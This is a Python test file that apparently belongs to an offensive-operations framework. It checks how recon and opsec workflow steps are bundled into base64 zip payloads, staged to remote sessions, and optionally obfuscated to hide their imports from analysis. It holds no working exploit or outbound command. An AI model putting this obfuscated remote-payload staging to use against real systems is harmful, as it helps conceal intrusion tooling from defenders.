            Step(module="acme.ofx-api.split_values", run_with={}),
            workflow_dir=tmp_path,
            inputs={"strings": ["a", "b", "a"]},
            secrets={},
        )
        assert "from ofx.api.strings import remove_duplicate_string as _func" in wrapper
        proc = subprocess.run(
            [sys.executable, "-c", wrapper],
            capture_output=True,
            text=True,
            cwd=str(tmp_path),
        )
        assert proc.returncode == 0, proc.stderr
        assert _decode_sentinel(proc.stdout) == {"result": ["a", "b"]}


class TestApiPayloadBundling:
    """Remote payloads for api steps let the analyzer see the real import."""

    def _zip_members(self, payload: str) -> list[str]:
        match = re.search(r"_b64\.b64decode\('([^']+)'\)", payload)
        assert match, "bootstrap should embed the base64 zip archive"
        with zipfile.ZipFile(BytesIO(base64.b64decode(match.group(1)))) as zf:
            return zf.namelist()

    def test_payload_bundles_ofx_api_module_detected_from_wrapper(self, tmp_path):
        step = Step(module="local.api.recon.targets.split_targets", run_with={})
        payload = build_module_step_payload(
            step,
            workflow_dir=tmp_path,
            inputs={"values": ["1.2.3.4"]},
            secrets={},
            opsec_mode=False,
            obfuscate_sources=False,
        )
        assert "ofx remote UDF wrapper" in payload
        assert "ofx.api.recon.targets" in payload
        # The wrapper's real ``from ofx.api.<path> import`` line is visible to
        # the AST analyzer, so the module files are bundled with no hints.
        members = self._zip_members(payload)
        assert any(name.startswith("ofx/api/recon") for name in members)

    def test_udf_extra_modules_still_scanned_for_file_steps(self, tmp_path):
        udf = tmp_path / "api_udf.py"
        udf.write_text(
            "import ofx.api.opsec\n\ndef run(ctx):\n    return {'ok': 1}\n"
        )
        step = Step(module=f"{udf}::run", run_with={})
        payload = build_module_step_payload(
            step,
            workflow_dir=tmp_path,
            inputs={},
            secrets={},
            opsec_mode=False,
            obfuscate_sources=False,
        )
        assert "import ofx.api.opsec" in payload
        members = self._zip_members(payload)
        assert any(name.startswith("ofx/api/opsec") for name in members)

    def test_obfuscated_payload_hides_api_import(self, tmp_path):
        step = Step(module="local.api.recon.targets.split_targets", run_with={})
        payload = build_module_step_payload(
            step,
            workflow_dir=tmp_path,
            inputs={"values": ["1.2.3.4"]},
            secrets={},
            opsec_mode=True,
            obfuscate_sources=True,
        )
        assert "ofx remote UDF wrapper" not in payload
        assert "from ofx.api.recon.targets import" not in payload


class TestSessionApiStepBundling:
    """Api steps are staged to remote sessions like UDFs."""

    def test_iter_python_step_bundles_stages_api_step(self, tmp_path):
        step = Step(module="local.api.recon.targets.split_targets", run_with={})
        bundles = list(iter_python_step_bundles([step], workflow_dir=tmp_path))
        assert [(idx, name) for idx, name, _ in bundles] == [(0, ".ofx_step_0.py")]

    def test_session_script_routes_api_step_to_python(self, tmp_path):
        step = Step(module="local.api.recon.targets.split_targets", run_with={})
        script = build_session_script([step], session_id="s1", work_dir="/tmp/s")
        assert '"$__OFX_PY_BIN" ".ofx_step_0.py"' in script


if __name__ == "__main__":
    import pytest

    pytest.main([__file__, "-v"])
